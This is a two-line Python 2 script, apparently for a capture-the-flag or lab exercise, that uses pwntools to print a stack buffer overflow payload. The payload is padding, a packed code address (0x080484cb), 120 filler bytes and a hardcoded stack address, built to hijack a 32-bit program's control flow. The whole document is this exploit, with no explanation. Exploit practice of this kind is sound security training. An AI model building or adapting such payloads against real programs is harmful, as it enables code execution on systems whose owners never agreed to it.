from pwn import *

print "A"*4 + p32(0x080484cb) + "C" *120 + p32(0xffffd318)
